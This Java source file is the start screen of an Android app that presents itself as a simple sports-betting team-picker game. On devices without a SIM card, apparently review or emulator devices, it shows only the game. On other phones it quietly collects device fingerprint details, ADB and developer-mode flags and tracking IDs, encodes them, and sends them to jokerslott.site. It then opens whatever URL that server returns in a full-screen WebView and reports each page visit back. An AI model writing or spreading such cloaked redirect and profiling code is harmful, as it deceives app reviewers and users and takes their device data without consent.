package com.esportebet365.apostasonline;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.util.Pair;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.TextView;

import com.appsflyer.AppsFlyerLib;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Objects;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class StartActivity extends AppCompatActivity {

    ImageView ivContinue;
    ImageView[] ivFlags = new ImageView[TeamType.values().length];

    private View.OnClickListener m_clickListener = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            selectTeam(view);
        }
    };

    private WebView bringer;
    private View esportbet;
    private View load;
    private ValueCallback<Uri[]> syncMes;
    private final static int FILECHOOSER_RESULTCODE=1;

    private Handler rado;
    private String apperId = "";
    private String reni = "null";
    private String otrybId = "null";

    private static boolean apoStas = false;

    int rgb, developer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);

        rgb = android.provider.Settings.Global.getInt(getApplicationContext().getContentResolver(), "adb_enabled", 0);
        developer = Settings.Secure.getInt(getApplicationContext().getContentResolver(), "development_settings_enabled", 0);

        ivFlags[TeamType.Argentina.ordinal()] = findViewById(R.id.iv_argentina);
        ivFlags[TeamType.Belgium.ordinal()] = findViewById(R.id.iv_belgium);
        ivFlags[TeamType.Brazil.ordinal()] = findViewById(R.id.iv_brazil);
        ivFlags[TeamType.GreatBritain.ordinal()] = findViewById(R.id.iv_greatbritain);
        ivFlags[TeamType.Turkey.ordinal()] = findViewById(R.id.iv_turkey);
        ivFlags[TeamType.Korea.ordinal()] = findViewById(R.id.iv_korea);
        ivFlags[TeamType.Japan.ordinal()] = findViewById(R.id.iv_japan);
        ivFlags[TeamType.France.ordinal()] = findViewById(R.id.iv_france);
        ivFlags[TeamType.Finland.ordinal()] = findViewById(R.id.iv_finland);

        for (ImageView ivFlag : ivFlags) {
            ivFlag.setOnClickListener(m_clickListener);
        }

        ivContinue = findViewById(R.id.iv_continue);
        ivContinue.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                contin();
            }
        });
        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int simmer = telMgr.getSimState();
        if (simmer == TelephonyManager.SIM_STATE_ABSENT) {
            esportbet = (View) findViewById(R.id.apostas);
            load = (View) findViewById(R.id.load);
            load.setVisibility(View.INVISIBLE);
            esportbet.setVisibility(View.VISIBLE);

            ivFlags[TeamType.Argentina.ordinal()] = findViewById(R.id.iv_argentina);
            ivFlags[TeamType.Belgium.ordinal()] = findViewById(R.id.iv_belgium);
            ivFlags[TeamType.Brazil.ordinal()] = findViewById(R.id.iv_brazil);
            ivFlags[TeamType.GreatBritain.ordinal()] = findViewById(R.id.iv_greatbritain);
            ivFlags[TeamType.Turkey.ordinal()] = findViewById(R.id.iv_turkey);
            ivFlags[TeamType.Korea.ordinal()] = findViewById(R.id.iv_korea);
            ivFlags[TeamType.Japan.ordinal()] = findViewById(R.id.iv_japan);
            ivFlags[TeamType.France.ordinal()] = findViewById(R.id.iv_france);
            ivFlags[TeamType.Finland.ordinal()] = findViewById(R.id.iv_finland);

            for (ImageView ivFlag : ivFlags) {
                ivFlag.setOnClickListener(m_clickListener);
            }

            ivContinue = findViewById(R.id.iv_continue);
            ivContinue.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    contin();
                }
            });

        } else {
            letsgo();
        }
    }
    @Override
    protected void onStart() {
        super.onStart();

        AppAll.setTeam(null);
        AppAll.setTour(0);

        for (ImageView view : ivFlags) {
            view.setSelected(false);
        }
        ivContinue.setVisibility(View.INVISIBLE);
    }

    private void selectTeam(View view) {
        TeamType teamType = null;
        for (int cnt = 0; cnt < ivFlags.length; cnt++) {
            ivFlags[cnt].setSelected(false);
            if (ivFlags[cnt] == view) {
                ivFlags[cnt].setSelected(true);
                teamType = TeamType.values()[cnt];
            }
        }
        AppAll.setTeam(teamType);

        ivContinue.setVisibility(View.VISIBLE);
    }

    private void contin() {
        ArrayList<Integer> teams = new ArrayList<>();

        TeamType firstTeam = AppAll.getTeam();
        teams.add(firstTeam.ordinal());
        TeamType secondTeam = TeamType.values()[AppAll.getRandom(TeamType.values().length, firstTeam.ordinal())];
        teams.add(secondTeam.ordinal());
        AppAll.setPair(0, new Pair<>(firstTeam, secondTeam));

        for (int cnt = 1; cnt < 4; cnt++) {
            firstTeam = TeamType.values()[AppAll.getRandom(TeamType.values().length, teams)];
            teams.add(firstTeam.ordinal());
            secondTeam = TeamType.values()[AppAll.getRandom(TeamType.values().length, teams)];
            teams.add(secondTeam.ordinal());
            AppAll.setPair(cnt, new Pair<>(firstTeam, secondTeam));
        }

        Intent intent = new Intent(StartActivity.this,BetActivity.class);
        startActivity(intent);
    }
    @SuppressLint("UseCompatLoadingForDrawables")
    public void letsgo(){
        plicationOpen();
        inVi();
        rado = new Handler(Looper.getMainLooper(), msg -> {
            if (msg.obj.equals("close"))
                esportbet.setVisibility(View.VISIBLE);
            else if (msg.obj.equals("close"))
                load.setVisibility(View.INVISIBLE);
            else
                strt((String) msg.obj);
            return false;
        });

        String read = study();

        oneSi();

        appsRef();
    }

    private void inVi(){
        bringer = findViewById(R.id.bring);
        esportbet = (View) findViewById(R.id.apostas);
        load = (View) findViewById(R.id.load);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void strt(String s){
        load.setVisibility(View.INVISIBLE);
        esportbet.setVisibility(View.INVISIBLE);
        bringer.setVisibility(View.VISIBLE);
        bringer.setWebChromeClient(new MyClient());
        bringer.setWebViewClient(new MyWebClient());

        bringer.getSettings().setUseWideViewPort(true);
        bringer.getSettings().setLoadWithOverviewMode(true);

        bringer.getSettings().setDomStorageEnabled(true);
        bringer.getSettings().setJavaScriptEnabled(true);
        bringer.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        bringer.getSettings().setAllowFileAccess(true);
        bringer.getSettings().setAllowContentAccess(true);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);
        CookieManager.getInstance().setAcceptCookie(true);

        wOpen(s);

        bringer.loadUrl(s);


    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == FILECHOOSER_RESULTCODE) {
            if (syncMes == null)
                return;
            syncMes.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
            syncMes = null;
        }
    }

    private class MyClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            syncMes = filePathCallback;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent,"File Chooser"), FILECHOOSER_RESULTCODE);
            return true;
        }
    }

    @Override
    public void onBackPressed() {
        if (bringer.canGoBack()) {
            bringer.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void appsRef(){
        apperId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        otrybId = AppsFlyerLib.getInstance().getAttributionId(this);
        if (otrybId == null)
            otrybId = "null";

        if (!apoStas) {
            new Thread(this::gather).start();
        }
    }

    private void gather(){
        apoStas = true;
        Message message = new Message();
        message.obj = gatherer();
        rado.sendMessage(message);
    }

    private class MyWebClient extends WebViewClient {
        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if(!request.getUrl().toString().contains("accounts.google.com")) {
                if (request.getUrl().toString().startsWith("http"))
                    view.loadUrl(request.getUrl().toString());
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, request.getUrl()));
            }
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if(!url.contains("accounts.google.com")){
                if (url.startsWith("http"))
                    view.loadUrl(url);
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            }
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            wFinish(url);
            note(url);
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onReceivedError(WebView webview, WebResourceRequest request, WebResourceError error) {
            wError(request.getUrl() + "___" + error.getDescription());
        }
    }

    public String getUUID(){
        SharedPreferences sharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
        String uuid = sharedPreferences.getString("key", "null");

        if (uuid.equals("null")){
            uuid =  String.valueOf(java.util.UUID.randomUUID());
            SharedPreferences mySharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
            @SuppressLint("CommitPrefEdits") SharedPreferences.Editor editor = mySharedPreferences.edit();
            editor.putString("key", uuid);
            editor.apply();
        }
        return uuid;
    }

    public String gatherer(){
        int i = 0;

        while (true){
            String apsInfo = studyClue("nil");
            if (!apsInfo.equals("nil") || i == 5) {
                String read = study();
                String s = jsoner(apsInfo);
                if (read.length() > 0 && read.contains("ttp")) {
                    return forward("https://jokerslott.site/api/v1/redirect/create", s); //todo вставить ссылку на апи редирект
                }else {
                    return forward("https://jokerslott.site/api/v1/redirect/create", s);
                }
            } else {
                try {
                    Thread.sleep(1500);
                    i++;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                    i++;
                }
            }
        }
    }

    private String forward(String s, String s1){
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(s1, JSON);

        Request request = new Request.Builder()
                .url(s)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try (Response response = client.newCall(request).execute()) {
            String responseString = Objects.requireNonNull(response.body()).string();

            JSONObject respJSON = new JSONObject(responseString);
            Log.d("RESP", respJSON.toString());
            if (respJSON.getBoolean("success")) {
                note(respJSON.getString("url"));
                return respJSON.getString("url");
            }else{
                return "close";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "close";
        }
    }

    public String jsoner(String apsInfo){
        JSONObject jsonObject= new JSONObject();
        try{
            jsonObject.put("appsFlyerId", apperId);
            jsonObject.put("deeplink", reni);
            jsonObject.put("attributionId", otrybId);
            jsonObject.put("apsInfo", new JSONObject(apsInfo));
            jsonObject.put("phoneInfo", writeJson());

            String encodedJson = new String(Base64.encode(jsonObject.toString().getBytes(), Base64.NO_WRAP));
            jsonObject = new JSONObject();
            jsonObject.put("data", encodedJson);

            return jsonObject.toString();
        }catch (Exception e){
            return "";
        }
    }

    private void oneSi(){
        OneSignal.initWithContext(this);
        OneSignal.setAppId("4fb25af8-00bc-4688-ba3e-c12e9ec384a4");//todo вставить ключ сигнала

        String externalUserId = getUUID();

        OneSignal.setExternalUserId(externalUserId, new OneSignal.OSExternalUserIdUpdateCompletionHandler() {
            @Override
            public void onSuccess(JSONObject results) {
                try {
                    if (results.has("push") && results.getJSONObject("push").has("success")) {
                        boolean isPushSuccess = results.getJSONObject("push").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for push status: " + isPushSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                try {
                    if (results.has("email") && results.getJSONObject("email").has("success")) {
                        boolean isEmailSuccess = results.getJSONObject("email").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for email status: " + isEmailSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                try {
                    if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                        boolean isSmsSuccess = results.getJSONObject("sms").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for sms status: " + isSmsSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(OneSignal.ExternalIdError error) {
                // The results will contain channel failure statuses
                // Use this to detect if external_user_id was not set and retry when a better network connection is made
                OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id done with error: " + error.toString());
            }
        });

    }

    public void wError(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_e_w");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> forward(jsonObject)).start();
    }

    public void plicationOpen(){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", "null");
            jsonObject.put("name", "a_o");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> forward(jsonObject)).start();
    }

    public void wOpen(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_o_w");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> forward(jsonObject)).start();
    }

    public void wFinish(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_p_f");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> forward(jsonObject)).start();
    }

    private void forward(JSONObject jsonObject){
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(String.valueOf(jsonObject), JSON);


        Request request = new Request.Builder()
                .url("https://jokerslott.site/v1/event/create")//todo вставить ссылку на апи ивентов
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try {
            client.newCall(request).execute();
        }catch (Exception e){
            e.printStackTrace();

        }
    }

    public JSONObject writeJson(){
        HashMap<String, String> map = new HashMap<>();
        map.put("user_agent", System.getProperties().getProperty("http.agent"));
        map.put("fingerprint", Build.FINGERPRINT);
        map.put("manufacturer", Build.MANUFACTURER);
        map.put("device", Build.DEVICE);
        map.put("model", Build.MODEL);
        map.put("brand", Build.BRAND);
        map.put("hardware", Build.HARDWARE);
        map.put("board", Build.BOARD);
        map.put("bootloader", Build.BOOTLOADER);
        map.put("tags", Build.TAGS);
        map.put("type", Build.TYPE);
        map.put("product", Build.PRODUCT);
        map.put("host", Build.HOST);
        map.put("display", Build.DISPLAY);
        map.put("id", Build.ID);
        map.put("user", Build.USER);
        map.put("adb_enabled", String.valueOf(rgb));
        map.put("development_settings_enabled", String.valueOf(developer));

        return new JSONObject(map);
    }

    public void note(String string) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("file", MODE_PRIVATE)));
            bw.write(string);
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String study() {
        StringBuilder s = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("file")));
            String str;
            while ((str = br.readLine()) != null) {
                s.append(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s.toString();
    }

    public String studyClue(String def){
        SharedPreferences myPrefs = getSharedPreferences("file", Context.MODE_PRIVATE);
        return myPrefs.getString("key1", def);
    }
}
